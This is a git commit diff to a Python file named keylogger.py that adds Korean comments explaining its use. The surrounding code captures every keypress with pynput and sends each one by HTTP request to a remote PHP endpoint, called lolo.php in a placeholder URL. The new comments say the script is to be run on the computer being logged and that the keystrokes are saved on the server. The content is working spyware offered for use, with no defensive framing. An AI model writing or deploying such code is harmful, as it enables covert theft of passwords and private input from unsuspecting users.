dd637a783bc12e3b4dadaf410712a53b6250ec27
JAEWONLEE <75537734+dpfmaptm1534@users.noreply.github.com>
2022-05-30 13:25:10 +0900

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -5,6 +5,8 @@ from pynput.keyboard import Key, Listener
 import logging
 import requests
 
+
+
 #로깅파일설치된 컴퓨터 내부에 로그파일저장
 #log_dir = r"./"
 #logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
@@ -15,5 +17,9 @@ def on_press(key):
     per=str(key)
     payload = {'k':per}
     r = requests.get('서버/php파일 여기서는 임의의 이름으로 lolo.php 라 하겠음', params=payload)
+
 with Listener(on_press=on_press) as listener:
     listener.join()
+
+#lolo.php 파일은 서버내에 존재해야함
+#keylogger.py는 키로깅할 컴퓨터에에서 실행하면 로그들이 lolo.php 로 전송되어 서버내 txt파일로 생성 및 저장
